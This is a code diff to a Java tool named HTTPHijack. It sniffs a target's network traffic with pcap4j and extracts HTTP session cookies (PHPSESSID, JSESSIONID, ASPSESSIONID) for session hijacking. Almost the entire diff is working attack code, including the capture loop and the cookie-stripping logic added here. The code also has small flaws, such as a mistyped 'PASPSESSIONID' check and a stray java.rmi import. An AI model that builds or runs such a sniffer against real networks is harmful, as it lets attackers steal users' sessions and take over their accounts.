@@ -1,14 +1,13 @@
-import java.io.*;
-
 import org.pcap4j.core.*;
 
+import java.io.*;
 import java.net.InetAddress;
-import java.net.UnknownHostException;
+import java.rmi.UnknownHostException;
 import java.util.concurrent.TimeoutException;
 
 public class HTTPHijack {
 
-    static void OpenFile(String name) {
+    private static void OpenFile(String name) {
         try {
             File myObj = new File(name);
             if (myObj.createNewFile()) {
@@ -22,11 +21,11 @@ public class HTTPHijack {
         }
 
     }
-    static void WritePackets(String target, int time){
+    private static void WritePackets(String target, int time){
         InetAddress addr = null;
         try {
             addr = InetAddress.getByName(target);
-        } catch (UnknownHostException e) {
+        } catch (java.net.UnknownHostException e) {
             e.printStackTrace();
         }
         PcapNetworkInterface nif = null;
@@ -63,7 +62,7 @@ public class HTTPHijack {
         } catch (PcapNativeException | NotOpenException | NullPointerException | IOException e) {
             e.printStackTrace();
         } catch (TimeoutException e){
-            System.out.println("Sniffing over!");
+            System.err.println("No cookies found yet!");
         }
         handle.close();
         try {
@@ -73,7 +72,7 @@ public class HTTPHijack {
         }
     }
 
-    static void StripPackets(){
+    private static void StripPackets(){
         BufferedReader reader;
         FileWriter dataWriter;
         try {
@@ -104,7 +103,7 @@ public class HTTPHijack {
         }
     }
 
-    static String[] StripData(){
+    private static String[] StripData(){
         String[] output = new String[2];
         BufferedReader reader;
         try {
@@ -117,9 +116,25 @@ public class HTTPHijack {
                     //System.out.println(host);
                 }
                 if(line.startsWith("Cookie:")){
-                    String cookie = line.substring(8);
-                    output[1] = cookie;
-                    return output;
+                    boolean containsSession = false;
+                    String cookie = line.substring(8);//JSESSIONID (Java EE), PHPSESSID (PHP), and ASPSESSIONID (Microsoft ASP).
+                    if(cookie.contains("PHPSESSID")){
+                        cookie = cookie.substring(cookie.indexOf("PHPSESSID"));
+                        containsSession = true;
+                    } else if(cookie.contains("JSESSIONID")){
+                        cookie = cookie.substring(cookie.indexOf("JSESSIONID"));
+                        containsSession = true;
+                    } else if(cookie.contains("PASPSESSIONID")){
+                        cookie = cookie.substring(cookie.indexOf("ASPSESSIONID"));
+                        containsSession = true;
+                    }
+                    if(cookie.contains(" ")){
+                        cookie = cookie.substring(0, cookie.indexOf(" "));
+                    }
+                    if(containsSession) {
+                        output[1] = cookie;
+                        return output;
+                    }
                 }
                 line = reader.readLine();
             }
@@ -134,11 +149,12 @@ public class HTTPHijack {
         OpenFile("DataOutput.txt");
         OpenFile("PacketsOutput.txt");
         for(int i = 0; i < timeout/10; i++) {
-            WritePackets(target, 10);
+            WritePackets(target, 9);
             StripPackets();
             String[] ans = StripData();
-            if(ans != null)
+            if(ans != null) {
                 return ans;
+            }
         }
         return null;
     }
